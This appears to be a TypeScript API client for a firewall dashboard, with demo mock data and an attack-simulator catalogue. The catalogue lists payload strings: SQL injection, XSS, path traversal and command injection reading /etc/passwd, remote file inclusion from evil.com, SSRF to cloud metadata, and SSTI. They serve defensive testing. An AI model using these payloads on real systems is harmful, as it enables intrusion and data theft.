import { 
    DashboardStats, 
    LogItem,
    MultiAgentSystemStats,
    TrafficStats,
    FlowInfo,
    AttackType,
    AttackSimulationReport
} from '../types/api';
import { isDemoModeActive } from '../config/demo-mode';

export const API_BASE_URL = '/api';

// --- Mock Data Generators ---
// Scenario: "Under Attack by SQL Injection"
// This ensures Scanner, Logs, and Dashboard stats tell the same story.

const generateMockStats = (): DashboardStats => {
    const history = Array.from({ length: 20 }, (_, i) => ({
        time: new Date(Date.now() - (20 - i) * 60000).toLocaleTimeString(),
        requests: Math.floor(Math.random() * 500) + 2000 + (Math.sin(i) * 500), // High traffic
        blocked: Math.floor(Math.random() * 100) + 50 // High blocks
    }));

    return {
        totalRequests: 845920,
        currentRPS: 450, // Higher load
        blockedRequests: 1243, // Significant blocked count
        activeConnections: 342,
        successRate: 98.2, // Slightly lower due to attacks
        history,
        threats: [
            { name: 'SQL Injection', value: 65, color: '#ef4444' }, // Dominant threat
            { name: 'XSS', value: 20, color: '#f59e0b' },
            { name: 'Bad Bot', value: 15, color: '#6366f1' }
        ]
    };
};

const generateMockLogs = (): LogItem[] => {
    // Scenario: Attacker trying SQL Injection on login
    const attackerIP = "203.15.44.12";

    return Array.from({ length: 15 }, (_, i) => {
        // High probability of attack logs
        const isAttack = i < 5; // Most recent 5 logs are attacks

        if (isAttack) {
            return {
                id: i,
                time: new Date(Date.now() - i * 2000).toISOString(),
                type: "SQL Injection",
                level: "WARN",
                message: "Blocked UNION SELECT payload in username field",
                ip: attackerIP,
                status: 403,
                method: "POST",
                path: "/api/v1/auth/login"
            };
        }

        return {
            id: i,
            time: new Date(Date.now() - i * 5000).toISOString(),
            type: "Access",
            level: "INFO",
            message: "Request processed successfully",
            ip: `192.168.1.${Math.floor(Math.random() * 255)}`,
            status: 200,
            method: "GET",
            path: ["/api/products", "/api/user/profile", "/api/settings"][Math.floor(Math.random() * 3)]
        };
    });
};

const generateMockTrafficStats = (): TrafficStats => {
    return {
        uptime: 86400 + Math.floor(Math.random() * 10000),
        packetsProcessed: 1500000 + Math.floor(Math.random() * 100000),
        packetsAllowed: 1400000 + Math.floor(Math.random() * 100000),
        packetsBlocked: 23 + Math.floor(Math.random() * 10),
        packetsInspected: 50000 + Math.floor(Math.random() * 10000),
        bytesProcessed: 1073741824 + Math.floor(Math.random() * 100000000),
        currentFlows: 150 + Math.floor(Math.random() * 50),
        activeConnections: 150 + Math.floor(Math.random() * 50),
        droppedPackets: 0,
        bufferOverflows: 0,
        avgProcessingTime: 0.5 + Math.random(),
        cpuUsage: 10 + Math.random() * 20,
        memoryUsage: 30 + Math.random() * 20
    };
};

const generateMockFlows = (): FlowInfo[] => {
    return [
        {
            id: 'flow-1',
            sourceIP: '192.168.1.100',
            destIP: '10.0.0.50',
            sourcePort: 54321,
            destPort: 443,
            protocol: 'HTTPS',
            state: 'ESTABLISHED',
            packetCount: 45,
            byteCount: 15234,
            startTime: new Date(Date.now() - 60000).toISOString(),
            lastActivity: new Date().toISOString()
        },
        {
            id: 'flow-2',
            sourceIP: '203.15.44.12',
            destIP: '10.0.0.50',
            sourcePort: 12345,
            destPort: 80,
            protocol: 'HTTP',
            state: 'BLOCKED',
            packetCount: 12,
            byteCount: 892,
            startTime: new Date(Date.now() - 30000).toISOString(),
            lastActivity: new Date().toISOString()
        },
        {
            id: 'flow-3',
            sourceIP: '192.168.1.101',
            destIP: '10.0.0.51',
            sourcePort: 54322,
            destPort: 443,
            protocol: 'HTTPS',
            state: 'ESTABLISHED',
            packetCount: 120,
            byteCount: 45678,
            startTime: new Date(Date.now() - 120000).toISOString(),
            lastActivity: new Date().toISOString()
        }
    ];
};

const generateMockThreats = () => {
    return [
        {
            id: 'threat-1',
            type: 'SQL Injection',
            severity: 'critical',
            sourceIP: '203.15.44.12',
            target: '/api/auth/login',
            timestamp: new Date(Date.now() - 60000).toISOString(),
            blocked: true
        },
        {
            id: 'threat-2',
            type: 'XSS Attempt',
            severity: 'high',
            sourceIP: '185.220.101.33',
            target: '/api/search',
            timestamp: new Date(Date.now() - 120000).toISOString(),
            blocked: true
        },
        {
            id: 'threat-3',
            type: 'Brute Force',
            severity: 'medium',
            sourceIP: '45.33.32.156',
            target: '/api/auth/login',
            timestamp: new Date(Date.now() - 180000).toISOString(),
            blocked: true
        }
    ];
};

const getAuthHeaders = () => {
    // SECURITY FIX: No longer sending token in header
    // Token is now in httpOnly cookie, sent automatically with credentials: 'include'
    return {
        'Content-Type': 'application/json'
    };
};

// SECURITY FIX: Fetch options with credentials for httpOnly cookies
const fetchWithCredentials = (url: string, options: RequestInit = {}) => {
    return fetch(url, {
        ...options,
        credentials: 'include',
        headers: {
            ...getAuthHeaders(),
            ...options.headers
        }
    });
};

const isDemoMode = () => {
    return isDemoModeActive();
};

// --- API Functions ---

export const fetchStats = async (): Promise<DashboardStats> => {
    if (isDemoMode()) return generateMockStats();
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/stats`);
        if (!response.ok) throw new Error('Fetch failed');
        return response.json();
    } catch (e) {
        console.error('Failed to fetch stats:', e);
        return {
            totalRequests: 0,
            currentRPS: 0,
            blockedRequests: 0,
            activeConnections: 0,
            successRate: 0,
            history: [],
            threats: []
        };
    }
};

export const fetchSites = async () => {
    if (isDemoMode()) {
        return [
            { id: 1, domain: 'api.example.com', target: 'http://localhost:3000', status: 'secure' },
            { id: 2, domain: 'shop.example.com', target: 'http://localhost:3001', status: 'warning' },
            { id: 3, domain: 'blog.example.com', target: 'http://localhost:3002', status: 'secure' },
        ];
    }
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/sites`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        console.error('Failed to fetch sites:', e);
        return [];
    }
};

export const fetchLogs = async (): Promise<LogItem[]> => {
    if (isDemoMode()) return generateMockLogs();
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/logs`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        console.error('Failed to fetch logs:', e);
        return [];
    }
};

export const fetchScannerResults = async () => {
    if (isDemoMode()) {
        return [
            { id: 1, name: 'SQL Injection Vulnerability', severity: 'Critical', description: 'Unsanitized input in login endpoint allows SQL injection.', status: 'Open' },
            { id: 2, name: 'Weak SSL Configuration', severity: 'Medium', description: 'TLS 1.0 is still enabled on the server.', status: 'Open' },
            { id: 3, name: 'Missing Security Headers', severity: 'Low', description: 'X-Content-Type-Options header is not set.', status: 'Open' },
        ];
    }
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/scanner`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        console.error('Failed to fetch scanner results:', e);
        return [];
    }
};

// --- Deployment Wizard API ---

export const generateDeploymentConfig = async (payload: {
    serverType: 'nginx' | 'apache';
    profile: {
        port: number;
        serverName: string;
        rateLimit: number;
        upstream: string;
    };
    siteId?: string;
}) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/deployments/generate`, {
        method: 'POST',
        body: JSON.stringify(payload)
    });
    if (!response.ok) {
        throw new Error('Failed to generate deployment config');
    }
    return response.json();
};

export const saveDeploymentConfig = async (payload: {
    serverType: 'nginx' | 'apache';
    profile: Record<string, any>;
    configText: string;
    envSnippet: string;
    siteId?: string;
    name?: string;
}) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/deployments/save`, {
        method: 'POST',
        body: JSON.stringify(payload)
    });
    if (!response.ok) {
        throw new Error('Failed to save deployment config');
    }
    return response.json();
};

export const fetchDeploymentHistory = async (siteId?: string, limit: number = 20) => {
    const qs = new URLSearchParams();
    qs.set('limit', String(limit));
    if (siteId) qs.set('siteId', siteId);
    const response = await fetchWithCredentials(`${API_BASE_URL}/deployments/history/list?${qs.toString()}`);
    if (!response.ok) {
        return [];
    }
    const data = await response.json();
    return data?.data || [];
};

export const getDeploymentDownloadUrl = (deploymentId: string, format: 'conf' | 'env' | 'bundle' = 'bundle') => {
    return `${API_BASE_URL}/deployments/${deploymentId}/download?format=${format}`;
};

// --- Scanner Task API ---

export const createScanTask = async (payload: {
    targets: {
        urls: string[];
        host: {
            mode: 'local';
            includeSystem: boolean;
            includeWeb: boolean;
            includePorts: boolean;
        };
    };
    enginePolicy: 'opt_then_nuclei';
}) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/scanner/tasks`, {
        method: 'POST',
        body: JSON.stringify(payload)
    });
    if (!response.ok) {
        let message = 'Failed to create scan task';
        try {
            const data = await response.json();
            message = data?.error || message;
        } catch {
            const text = await response.text();
            if (text) message = text;
        }
        throw new Error(message);
    }
    return response.json();
};

export const fetchScanTask = async (taskId: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/scanner/tasks/${taskId}`);
    if (!response.ok) {
        throw new Error('Failed to fetch scan task');
    }
    return response.json();
};

export const fetchScanTaskResults = async (taskId: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/scanner/tasks/${taskId}/results`);
    if (!response.ok) {
        throw new Error('Failed to fetch scan task results');
    }
    return response.json();
};

export const cancelScanTask = async (taskId: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/scanner/tasks/${taskId}/cancel`, {
        method: 'POST'
    });
    if (!response.ok) {
        throw new Error('Failed to cancel scan task');
    }
    return response.json();
};

export const fetchScanHistory = async (limit: number = 20) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/scanner/tasks/history?limit=${limit}`);
    if (!response.ok) return [];
    const data = await response.json();
    return data?.data || [];
};

export const fetchAdminData = async () => {
    if (isDemoMode()) {
        return {
            errors: [
                { userId: 'admin', errorCode: 'AUTH_FAIL_BRUTE', message: 'Multiple failed login attempts detected', timestamp: new Date().toISOString() },
                { userId: 'system', errorCode: 'DB_CONN_TIMEOUT', message: 'Connection pool exhausted due to high load', timestamp: new Date(Date.now() - 1000 * 60).toISOString() }
            ],
            performance: {
                server: { cpu: 45.2, memory: 62.8 },
                clients: { total_agents: 12, avg_cpu_overhead: '0.4', avg_latency_added: '12ms' }
            }
        };
    }
    try {
        const errRes = await fetchWithCredentials(`${API_BASE_URL}/admin/errors`);
        const perfRes = await fetchWithCredentials(`${API_BASE_URL}/admin/performance`);

        return {
            errors: await errRes.json().catch(() => []),
            performance: await perfRes.json().catch(() => null)
        }
    } catch (e) {
        return null;
    }
};

export const fetchAlerts = async () => {
    if (isDemoMode()) {
        return [
            {
                id: 'ALT-2023-001',
                title: 'SQL Injection Detected',
                message: 'Multiple UNION SELECT payloads detected from IP 203.15.44.12 targeting /api/v1/auth/login. Firewall has r.blocked 45 attempts.',
                severity: 'Critical',
                type: 'security',
                source: 'WAF Rule #1024',
                time: 'Just now',
                status: 'active'
            },
            {
                id: 'ALT-2023-002',
                title: 'High Authentication Failure Rate',
                message: 'An unusual spike in failed login attempts was detected. 150 failures in the last minute.',
                severity: 'High',
                type: 'security',
                source: 'Auth Service',
                time: '2 mins ago',
                status: 'active'
            },
            {
                id: 'ALT-2023-003',
                title: 'Database Connection Pool Saturation',
                message: 'Active connections reached 85% of maximum capacity. Consider scaling up or optimizing queries.',
                severity: 'Medium',
                type: 'performance',
                source: 'Database Monitor',
                time: '1 hour ago',
                status: 'acknowledged'
            },
            {
                id: 'ALT-2023-004',
                title: 'New Admin Login',
                message: 'Successful login to Admin Console from 192.168.1.5',
                severity: 'Low',
                type: 'system',
                source: 'Audit Log',
                time: '3 hours ago',
                status: 'resolved'
            }
        ];
    }
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/alerts`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        return [];
    }
};

// --- Multi-Agent System API ---

const generateMockAgentStats = (): MultiAgentSystemStats => {
    return {
        orchestrator: {
            activeTasks: 3,
            registeredAgents: 3
        },
        messageBus: {
            queueSize: 5,
            subscriptionCount: 12,
            pendingRequests: 2
        },
        synthesis: {
            totalCaseFiles: 47,
            totalLessons: 156,
            totalPolicyUpdates: 23,
            topPatterns: [
                { pattern: 'SQL Injection', frequency: 45 },
                { pattern: 'XSS Attempt', frequency: 32 },
                { pattern: 'Brute Force', frequency: 18 }
            ]
        },
        health: {
            status: 'healthy',
            details: {}
        },
        agents: [
            { agentId: 'socrates', role: 'socrates', status: 'healthy', lastSeen: new Date().toISOString(), responseTime: 245, tasksCompleted: 23, tasksPending: 2, errorCount: 0 },
            { agentId: 'plato', role: 'plato', status: 'healthy', lastSeen: new Date().toISOString(), responseTime: 198, tasksCompleted: 19, tasksPending: 1, errorCount: 0 },
            { agentId: 'aristotle', role: 'aristotle', status: 'healthy', lastSeen: new Date().toISOString(), responseTime: 156, tasksCompleted: 5, tasksPending: 0, errorCount: 0 }
        ]
    };
};

export const fetchAgentSystemStats = async (): Promise<MultiAgentSystemStats | null> => {
    if (isDemoMode()) return generateMockAgentStats();
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/ai-system/agents/stats`);
        if (!response.ok) throw new Error('Failed to fetch agent stats');
        return response.json();
    } catch (e) {
        console.error('Failed to fetch agent system stats:', e);
        return null;
    }
};

export const fetchAgentHealth = async () => {
    if (isDemoMode()) {
        return {
            status: 'healthy',
            details: {
                socrates: { status: 'active', lastActivity: new Date().toISOString() },
                plato: { status: 'active', lastActivity: new Date().toISOString() },
                aristotle: { status: 'active', lastActivity: new Date().toISOString() }
            }
        };
    }
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/ai-system/agents/health`);
        if (!response.ok) throw new Error('Failed to fetch agent health');
        return response.json();
    } catch (e) {
        console.error('Failed to fetch agent health:', e);
        return { status: 'unknown', details: {} };
    }
};

// --- Traffic Interceptor API ---

export const fetchTrafficStats = async (): Promise<TrafficStats | null> => {
    if (isDemoMode()) return generateMockTrafficStats();
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/ai-system/traffic/stats`);
        if (!response.ok) throw new Error('Failed to fetch traffic stats');
        return response.json();
    } catch (e) {
        console.error('Failed to fetch traffic stats:', e);
        return null;
    }
};

export const fetchActiveFlows = async (): Promise<FlowInfo[]> => {
    if (isDemoMode()) return generateMockFlows();
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/ai-system/traffic/flows`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        console.error('Failed to fetch active flows:', e);
        return [];
    }
};

export const fetchProtocolDistribution = async () => {
    if (isDemoMode()) return { http: 25, https: 65, dns: 8, other: 2 };
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/ai-system/traffic/protocols`);
        if (!response.ok) throw new Error('Failed to fetch protocol distribution');
        return response.json();
    } catch (e) {
        console.error('Failed to fetch protocol distribution:', e);
        return { http: 0, https: 0, dns: 0, other: 0 };
    }
};

export const fetchThreatDetections = async () => {
    if (isDemoMode()) return generateMockThreats();
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/ai-system/traffic/threats`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        console.error('Failed to fetch threat detections:', e);
        return [];
    }
};

// --- Attack Simulator API ---

const generateMockAttackTypes = (): AttackType[] => {
    return [
        // SQL Injection Attacks
        { id: 'sql-1', name: 'SQL Injection - OR Bypass', category: 'sql_injection', severity: 'critical', description: "' OR '1'='1' --" },
        { id: 'sql-2', name: 'SQL Injection - UNION', category: 'sql_injection', severity: 'critical', description: 'UNION SELECT * FROM users' },
        { id: 'sql-3', name: 'SQL Injection - Comment', category: 'sql_injection', severity: 'high', description: "admin'--" },
        { id: 'sql-4', name: 'SQL Injection - Time-Based', category: 'sql_injection', severity: 'high', description: "'; WAITFOR DELAY '0:0:5'--" },
        { id: 'sql-5', name: 'SQL Injection - Error-Based', category: 'sql_injection', severity: 'high', description: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--" },
        { id: 'sql-6', name: 'SQL Injection - Stacked', category: 'sql_injection', severity: 'critical', description: "'; DROP TABLE users--" },
        { id: 'sql-7', name: 'SQL Injection - Second Order', category: 'sql_injection', severity: 'critical', description: 'Stored in database, executed later' },
        { id: 'sql-8', name: 'NoSQL Injection', category: 'nosql_injection', severity: 'high', description: "username[$ne]=admin" },

        // XSS Attacks
        { id: 'xss-1', name: 'XSS - Script Tag', category: 'xss', severity: 'high', description: "<script>alert('XSS')</script>" },
        { id: 'xss-2', name: 'XSS - Event Handler', category: 'xss', severity: 'high', description: '<img src=x onerror=alert(1)>' },
        { id: 'xss-3', name: 'Stored XSS', category: 'xss', severity: 'critical', description: 'Persists in database, affects all users' },
        { id: 'xss-4', name: 'DOM XSS', category: 'xss', severity: 'high', description: 'location.hash.slice(1)' },
        { id: 'xss-5', name: 'Self XSS', category: 'xss', severity: 'low', description: 'User attacks themselves with malicious script' },
        { id: 'xss-6', name: 'Reflected XSS', category: 'xss', severity: 'high', description: 'Immediate reflection in HTTP response' },
        { id: 'xss-7', name: 'Polyglot XSS', category: 'xss', severity: 'high', description: 'Works across multiple contexts' },
        { id: 'xss-8', name: 'XSS via POST', category: 'xss', severity: 'medium', description: 'Stored through POST parameter' },

        // Path Traversal Attacks
        { id: 'path-1', name: 'Path Traversal - Basic', category: 'path_traversal', severity: 'critical', description: '../../../etc/passwd' },
        { id: 'path-2', name: 'Path Traversal - Null Byte', category: 'path_traversal', severity: 'high', description: '../../../etc/passwd%00.jpg' },
        { id: 'path-3', name: 'Path Traversal - URL Encoded', category: 'path_traversal', severity: 'high', description: '%2e%2e%2fetc%2fpasswd' },
        { id: 'path-4', name: 'Windows Path Traversal', category: 'path_traversal', severity: 'critical', description: '..\\..\\..\\windows\\system32\\' },
        { id: 'path-5', name: 'Local File Inclusion', category: 'file_inclusion', severity: 'critical', description: 'include.php?file=../../etc/passwd' },
        { id: 'path-6', name: 'Remote File Inclusion', category: 'file_inclusion', severity: 'critical', description: 'include.php?file=http://evil.com/shell.php' },

        // Command Injection Attacks
        { id: 'cmd-1', name: 'Command Injection - Semicolon', category: 'command_injection', severity: 'critical', description: '127.0.0.1; cat /etc/passwd' },
        { id: 'cmd-2', name: 'Command Injection - Pipe', category: 'command_injection', severity: 'critical', description: '127.0.0.1 | whoami' },
        { id: 'cmd-3', name: 'Command Injection - Backtick', category: 'command_injection', severity: 'critical', description: '127.0.0.1 `ls -la`' },
        { id: 'cmd-4', name: 'Command Injection - Newline', category: 'command_injection', severity: 'high', description: '127.0.0.1\\ncat /etc/passwd' },
        { id: 'cmd-5', name: 'Command Injection - Argument', category: 'command_injection', severity: 'high', description: 'upload.php -filename evil.txt' },
        { id: 'cmd-6', name: 'Command Injection - Subshell', category: 'command_injection', severity: 'critical', description: '$(cat /etc/passwd)' },

        // Rate Limit / DoS Attacks
        { id: 'rate-1', name: 'Rate Limit Abuse', category: 'rate_abuse', severity: 'medium', description: '100 requests in 1 second' },
        { id: 'rate-2', name: 'HTTP Flood', category: 'dos', severity: 'critical', description: 'Distributed HTTP request flood' },
        { id: 'rate-3', name: 'SYN Flood', category: 'dos', severity: 'critical', description: 'TCP SYN packet flood' },
        { id: 'rate-4', name: 'UDP Flood', category: 'dos', severity: 'high', description: 'UDP packet amplification attack' },
        { id: 'rate-5', name: 'Slowloris', category: 'dos', severity: 'high', description: 'Slow HTTP connection exhaustion' },
        { id: 'rate-6', name: 'Ping Flood', category: 'dos', severity: 'medium', description: 'ICMP echo request flood' },
        { id: 'rate-7', name: 'Smurf Attack', category: 'dos', severity: 'high', description: 'ICMP broadcast amplification' },
        { id: 'rate-8', name: 'DNS Amplification', category: 'dos', severity: 'high', description: 'DNS amplification attack' },

        // CSRF Attacks
        { id: 'csrf-1', name: 'Basic CSRF', category: 'csrf', severity: 'high', description: 'Cross-site request forgery' },
        { id: 'csrf-2', name: 'Stored CSRF', category: 'csrf', severity: 'high', description: 'Stored CSRF payload' },
        { id: 'csrf-3', name: 'Login CSRF', category: 'csrf', severity: 'high', description: 'CSRF during login flow' },
        { id: 'csrf-4', name: 'CSRF Token Bypass', category: 'csrf', severity: 'critical', description: 'Missing or weak CSRF token' },

        // SSRF Attacks
        { id: 'ssrf-1', name: 'SSRF - Internal Port Scan', category: 'ssrf', severity: 'critical', description: 'http://127.0.0.1:22' },
        { id: 'ssrf-2', name: 'SSRF - Cloud Metadata', category: 'ssrf', severity: 'critical', description: 'http://169.254.169.254/latest/meta-data/' },
        { id: 'ssrf-3', name: 'SSRF - File Protocol', category: 'ssrf', severity: 'high', description: 'file:///etc/passwd' },
        { id: 'ssrf-4', name: 'SSRF - DNS Rebinding', category: 'ssrf', severity: 'high', description: 'DNS-based SSRF bypass' },
        { id: 'ssrf-5', name: 'SSRF - Gopher Protocol', category: 'ssrf', severity: 'high', description: 'gopher://127.0.0.1:6379/_*1%0d%0a' },

        // XXE Attacks
        { id: 'xxe-1', name: 'XXE - File Disclosure', category: 'xxe', severity: 'critical', description: 'XXE to read /etc/passwd' },
        { id: 'xxe-2', name: 'XXE - SSRF', category: 'xxe', severity: 'critical', description: 'XXE for server-side request forgery' },
        { id: 'xxe-3', name: 'Blind XXE', category: 'xxe', severity: 'high', description: 'XXE with OOB data exfiltration' },
        { id: 'xxe-4', name: 'XXE DoS', category: 'xxe', severity: 'high', description: 'Billion laughs attack' },

        // LDAP Injection
        { id: 'ldap-1', name: 'LDAP Injection - Basic', category: 'ldap_injection', severity: 'high', description: '(&(uid=*)(password=*))' },
        { id: 'ldap-2', name: 'LDAP Injection - AND', category: 'ldap_injection', severity: 'high', description: '(&(uid=admin)(password=*))' },
        { id: 'ldap-3', name: 'LDAP injection - OR', category: 'ldap_injection', severity: 'critical', description: '(|(uid=admin)(uid=test))' },
        { id: 'ldap-4', name: 'LDAP Blind Injection', category: 'ldap_injection', severity: 'high', description: 'Timing-based LDAP injection' },

        // HTTP Smuggling
        { id: 'http-1', name: 'HTTP Smuggling - CL.TE', category: 'http_smuggling', severity: 'high', description: 'Content-Length + Transfer-Encoding clash' },
        { id: 'http-2', name: 'HTTP Smuggling - TE.CL', category: 'http_smuggling', severity: 'high', description: 'Transfer-Encoding + Content-Length clash' },
        { id: 'http-3', name: 'Request Splitting', category: 'http_smuggling', severity: 'critical', description: 'CRLF injection to split requests' },
        { id: 'http-4', name: 'Cache Poisoning', category: 'http_smuggling', severity: 'critical', description: 'HTTP smuggling cache poisoning' },

        // SSTI Attacks
        { id: 'ssti-1', name: 'Jinja2 SSTI', category: 'ssti', severity: 'critical', description: '{{config.items()}}' },
        { id: 'ssti-2', name: 'ERB SSTI', category: 'ssti', severity: 'critical', description: '<%= system("id") %>' },
        { id: 'ssti-3', name: 'Twig SSTI', category: 'ssti', severity: 'critical', description: '{{_self.env.display("id")}}' },
        { id: 'ssti-4', name: 'FreeMarker SSTI', category: 'ssti', severity: 'high', description: '<#assign ex="freemarker.template.utility.Execute">' },

        // Deserialization Attacks
        { id: 'deser-1', name: 'Java Deserialization', category: 'deserialization', severity: 'critical', description: 'ysoserial CommonsCollections1' },
        { id: 'deser-2', name: 'PHP Object Injection', category: 'deserialization', severity: 'critical', description: 'Unserialize gadget chain' },
        { id: 'deser-3', name: 'Python Pickle', category: 'deserialization', severity: 'critical', description: 'Malicious pickle payload' },
        { id: 'deser-4', name: 'Node.js Deserialization', category: 'deserialization', severity: 'high', description: 'node-serialize exploit' },

        // Privilege Escalation
        { id: 'priv-1', name: 'IDOR', category: 'privilege_escalation', severity: 'high', description: 'Insecure direct object reference' },
        { id: 'priv-2', name: 'Broken Access Control', category: 'privilege_escalation', severity: 'high', description: 'Bypass admin endpoint access' },
        { id: 'priv-3', name: 'Privilege Boundary', category: 'privilege_escalation', severity: 'critical', description: 'Cross-privilege access' },
        { id: 'priv-4', name: 'Role-Based Bypass', category: 'privilege_escalation', severity: 'high', description: 'RBAC misconfiguration' },

        // Man in the Middle
        { id: 'mitm-1', name: 'SSL Strip', category: 'man_in_the_middle', severity: 'high', description: 'Downgrade HTTPS to HTTP' },
        { id: 'mitm-2', name: 'ARP Poisoning', category: 'man_in_the_middle', severity: 'high', description: 'ARP cache poisoning' },
        { id: 'mitm-3', name: 'DNS Spoofing', category: 'dns_hijacking', severity: 'high', description: 'Fake DNS responses' },
        { id: 'mitm-4', name: 'BGP Hijacking', category: 'man_in_the_middle', severity: 'critical', description: 'BGP route hijacking' },

        // Cache Poisoning
        { id: 'cache-1', name: 'Web Cache Poisoning', category: 'cache_poisoning', severity: 'high', description: 'Cache key manipulation' },
        { id: 'cache-2', name: 'Cache Deception', category: 'cache_poisoning', severity: 'high', description: 'Cache header manipulation' },
        { id: 'cache-3', name: 'DNS Cache Poisoning', category: 'dns_hijacking', severity: 'high', description: 'Cache pollution attack' },

        // Clickjacking
        { id: 'click-1', name: 'Basic Clickjacking', category: 'clickjacking', severity: 'medium', description: 'UI redress attack via iframe' },
        { id: 'click-2', name: 'Likejacking', category: 'clickjacking', severity: 'low', description: 'Clickjacking social networks' },

        // Replay Attack
        { id: 'replay-1', name: 'Token Replay', category: 'replay_attack', severity: 'high', description: 'Replay captured JWT' },
        { id: 'replay-2', name: 'OTP Replay', category: 'replay_attack', severity: 'medium', description: 'Reuse one-time password' },

        // Session Fixation
        { id: 'sess-1', name: 'Session Fixation', category: 'session_fixation', severity: 'high', description: 'Enforce fixed session ID' },
        { id: 'sess-2', name: 'Session Hijacking', category: 'session_fixation', severity: 'high', description: 'Steal and use session cookie' },

        // User Enumeration
        { id: 'enum-1', name: 'User Enumeration', category: 'user_enumeration', severity: 'medium', description: 'Guess existing usernames' },
        { id: 'enum-2', name: 'Email Enumeration', category: 'user_enumeration', severity: 'medium', description: 'Password reset email timing' },

        // CORS Misconfiguration
        { id: 'cors-1', name: 'CORS Wildcard', category: 'cors_misconfig', severity: 'medium', description: 'Access-Control-Allow-Origin: *' },
        { id: 'cors-2', name: 'CORS Bypass', category: 'cors_misconfig', severity: 'high', description: 'Reflect origin without validation' },

        // Host Header Injection
        { id: 'host-1', name: 'Host Header Injection', category: 'host_header_injection', severity: 'medium', description: 'Poison Host header value' },
        { id: 'host-2', name: 'Cache Poisoning via Host', category: 'host_header_injection', severity: 'high', description: 'Host-based cache poisoning' },

        // Auth Bypass
        { id: 'auth-1', name: 'JWT None Algorithm', category: 'jwt_attacks', severity: 'critical', description: 'alg: none bypass' },
        { id: 'auth-2', name: 'Weak JWT Secret', category: 'jwt_attacks', severity: 'high', description: 'Brute force JWT secret' },
        { id: 'auth-3', name: 'JWT Key Confusion', category: 'jwt_attacks', severity: 'high', description: 'RSA/HMAC confusion attack' },
        { id: 'auth-4', name: 'Hardcoded Credentials', category: 'auth_bypass', severity: 'critical', description: 'Default admin credentials' },
        { id: 'auth-5', name: 'Authentication Bypass', category: 'auth_bypass', severity: 'critical', description: 'Skip auth check entirely' },

        // File Upload Attacks
        { id: 'upload-1', name: 'Shell Upload', category: 'file_upload', severity: 'critical', description: 'Upload malicious PHP shell' },
        { id: 'upload-2', name: 'MIME Type Bypass', category: 'file_upload', severity: 'high', description: 'Upload PHP as .jpg' },
        { id: 'upload-3', name: 'ImageTragick', category: 'file_upload', severity: 'high', description: 'Polyglot JPG/PHP' },

        // GraphQL Injection
        { id: 'graphql-1', name: 'GraphQL Injection', category: 'graphql_injection', severity: 'high', description: 'Inject into GraphQL query' },
        { id: 'graphql-2', name: 'GraphQL DoS', category: 'graphql_injection', severity: 'medium', description: 'Nested query DoS' },
        { id: 'graphql-3', name: 'GraphQL Introspection', category: 'graphql_injection', severity: 'low', description: 'Dump GraphQL schema' },

        // WebSocket Attacks
        { id: 'ws-1', name: 'WebSocket XSS', category: 'websocket_attacks', severity: 'high', description: 'XSS via WebSocket message' },
        { id: 'ws-2', name: 'WebSocket DoS', category: 'websocket_attacks', severity: 'medium', description: 'WebSocket message flood' },

        // API Security
        { id: 'api-1', name: 'Mass Assignment', category: 'api_security', severity: 'medium', description: 'Overwrite object fields' },
        { id: 'api-2', name: 'IDOR', category: 'api_security', severity: 'high', description: 'Access other users\' data' },
        { id: 'api-3', name: 'API Key Leakage', category: 'api_security', severity: 'high', description: 'Expose API keys in logs' },

        // Container/Cloud Attacks
        { id: 'cont-1', name: 'Container Escape', category: 'container_escape', severity: 'critical', description: 'Break out of Docker container' },
        { id: 'cont-2', name: 'K8s RBAC Bypass', category: 'kubernetes_attack', severity: 'critical', description: 'Escalate K8s privileges' },
        { id: 'cont-3', name: 'IAM Privilege Escalation', category: 'cloud_infrastructure', severity: 'critical', description: 'Escalate cloud IAM roles' },
        { id: 'cont-4', name: 'SSRF in Cloud', category: 'cloud_infrastructure', severity: 'critical', description: 'Access cloud metadata service' },
        { id: 'cont-5', name: 'Secret Exposure', category: 'cloud_infrastructure', severity: 'high', description: 'Leak cloud credentials' }
    ];
};

const generateMockAttackReport = (attackIds?: string[]): AttackSimulationReport => {
    const types = generateMockAttackTypes();
    const selectedTypes = attackIds && attackIds.length > 0 
        ? types.filter(t => attackIds.includes(t.id))
        : types.slice(0, 5);
    
    const results = selectedTypes.map(attack => ({
        attackId: attack.id,
        attackName: attack.name,
        category: attack.category,
        severity: attack.severity,
        blocked: Math.random() > 0.15,
        responseTime: Math.floor(Math.random() * 100) + 10
    }));

    return {
        total: results.length,
        blocked: results.filter(r => r.blocked).length,
        allowed: results.filter(r => !r.blocked).length,
        errors: 0,
        results,
        startTime: new Date().toISOString(),
        endTime: new Date().toISOString()
    };
};

export const fetchAttackTypes = async (): Promise<AttackType[]> => {
    if (isDemoMode()) return generateMockAttackTypes();
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/attack/types`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        console.error('Failed to fetch attack types:', e);
        return [];
    }
};

export const runAttackSimulation = async (attackIds?: string[]): Promise<AttackSimulationReport | null> => {
    if (isDemoMode()) return generateMockAttackReport(attackIds);
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/attack/simulate`, {
            method: 'POST',
